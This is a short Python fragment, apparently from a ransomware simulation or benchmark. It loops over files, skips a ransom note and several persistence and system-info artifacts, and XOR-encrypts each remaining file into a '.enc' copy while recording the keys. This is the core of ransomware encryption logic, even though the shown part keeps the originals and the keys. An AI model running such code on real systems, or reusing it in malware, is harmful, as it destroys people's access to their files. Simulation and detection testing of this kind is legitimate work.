        if source.name.endswith(".enc"):
            continue
        if source.name in {
            "RANSOM_NOTE.txt",
            "controlled_endpoint_report.json",
            "persistence_manifest.json",
            "system_info.json",
        }:
            continue

        try:
            data = source.read_bytes()
            key = derive_key(data)
            encrypted = xor_encrypt(data, key)
            destination = source.with_name(source.name + ".enc")

            with tempfile.NamedTemporaryFile(
                mode="wb",
                dir=directory,
                prefix=".benchmark-",
                suffix=".tmp",
                delete=False,
            ) as temporary:
                temporary.write(encrypted)
                temporary_path = Path(temporary.name)

            os.replace(temporary_path, destination)
            keys[source.name] = key.hex()
        except OSError:
            continue

    return keys


